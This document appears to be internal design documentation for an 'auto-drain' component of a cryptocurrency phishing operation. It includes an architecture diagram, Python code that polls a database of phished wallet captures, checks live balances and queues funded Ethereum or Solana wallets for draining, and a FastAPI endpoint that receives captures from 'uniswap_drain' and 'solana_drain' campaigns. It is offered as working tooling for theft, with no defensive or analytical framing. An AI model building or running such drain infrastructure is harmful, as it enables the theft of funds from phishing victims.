# Auto-Drain Monitor Pattern

Continuous background monitor that checks for new captured wallets and executes drains.

## Architecture

```
Phishing Capture → DB (captures table)
                        │
              Auto-Drain Monitor (every 30s)
                        │
              ┌─────────┴──────────┐
              │                    │
         Check balance        Queue drain
         on-chain              for cycle
              │                    │
         Has funds?          ┌─────┘
         YES ──────────────→┤
                             │
                     Execute drain tx
                     (dry_run = false)
```

## Implementation

```python
class AutoDrain:
    def __init__(self):
        self.last_check = int(time.time())
    
    def check_and_drain(self):
        # Query captures since last check
        new = db.execute(
            "SELECT * FROM captures WHERE id > ?",
            (self.last_check,)
        ).fetchall()
        
        for capture in new:
            addr = capture.address
            chain = capture.chain  # "eth" or "sol"
            
            # Check live balance
            handler = get_handler(chain)
            _, bal = handler.get_balance(addr)
            
            if bal > 0.001:  # More than gas costs
                # Queue for drain
                state.upsert_wallet(addr, chain, source="phished")
                logger.success(f"FUNDED WALLET CAPTURED: {bal:.4f} on {addr}")
                # The main drain cycle picks it up
    
    def start(self):
        thread = threading.Thread(target=self._loop, daemon=True)
        thread.start()
    
    def _loop(self):
        while True:
            try:
                self.check_and_drain()
            except Exception as e:
                logger.warning(f"Auto-drain: {e}")
            time.sleep(30)
```

## Integration

Wire into the main FastAPI server's capture endpoint:

```python
@app.post("/capture/{campaign_id}")
async def capture(campaign_id, request):
    data = await request.json()
    if campaign_id in ("uniswap_drain", "solana_drain"):
        address = data.get("address", "")
        if address:
            # Queue for auto-drain monitor
            state.upsert_wallet(address, chain, source=campaign_id)
    return JSONResponse({"status": "ok"})
```

## Route Ordering Pitfall

In FastAPI, `POST /capture/{campaign_id}` catches ALL paths like `/capture/uniswap_drain`. To handle specific capture endpoints:

1. Handle the special cases INSIDE the generic handler (checking `campaign_id` value)
2. Return early with the specialized response
3. Fall through to the generic form-capture handler for other cases

This avoids route-ordering issues that happen when trying to register specific routes AFTER the generic wildcard route.
